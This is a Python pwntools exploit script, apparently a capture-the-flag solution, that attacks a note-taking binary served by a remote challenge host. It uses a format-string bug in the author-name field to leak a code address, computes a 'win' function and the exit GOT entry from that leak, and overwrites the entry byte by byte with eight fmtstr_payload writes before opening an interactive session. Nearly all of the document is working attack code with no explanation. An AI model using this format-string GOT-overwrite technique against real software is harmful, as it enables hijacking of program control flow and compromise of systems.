from pwn import *
import string
# context.log_level = "debug"
context.arch = "amd64"
context.endian = "little"
context.binary = binary = ELF('./wald')

# p = process("./wald2")
p = remote("sisterlab.id", 42094)



p.sendlineafter("enter your name: ", b"billie")
p.sendlineafter("[>] user input: ", b"1")
p.sendlineafter("[>] enter note index: ", b"1")
p.sendlineafter("[>] enter note title: ", b"1")
p.sendlineafter("[>] enter note content: ", b"abcd")

p.sendlineafter("[>] user input: ", b"3")
p.sendline(b"")
p.sendlineafter("[>] enter new author name: ",b"%25$p")


p.sendlineafter("[>] user input: ", b"2")
p.sendlineafter("[>] enter note index: ", b"1")

leak = p.recvuntil(b"abcd")
main = leak[:-6]
main = main[26:]
win = int(main,16)-261
exit_got = int(main,16)+11642

format_str1 = fmtstr_payload(8, {exit_got: (win)&0xff},write_size="byte")
format_str2 = fmtstr_payload(8, {exit_got+1: (win>>8)&0xff},write_size="byte")
format_str3 = fmtstr_payload(8, {exit_got+2: (win>>16)&0xff},write_size="byte")
format_str4 = fmtstr_payload(8, {exit_got+3: (win>>24)&0xff},write_size="byte")
format_str5 = fmtstr_payload(8, {exit_got+4: (win>>32)&0xff},write_size="byte")
format_str6 = fmtstr_payload(8, {exit_got+5: (win>>40)&0xff},write_size="byte")
format_str7 = fmtstr_payload(8, {exit_got+6: (win>>48)&0xff},write_size="byte")
format_str8 = fmtstr_payload(8, {exit_got+7: (win>>56)&0xff},write_size="byte")

def sendexp(payload):
    p.sendline(b"3")
    p.sendline(b"A" + payload)
    p.sendline(b"2")
    p.sendline( b"1")

sendexp(format_str1)
sendexp(format_str2)
sendexp(format_str3)
sendexp(format_str4)
sendexp(format_str5)
sendexp(format_str6)
sendexp(format_str7)
sendexp(format_str8)





print(f"win ===== {hex(win)}")
print(f"exit ====== {hex(exit_got)}")
# p.sendline(b'4')
p.interactive()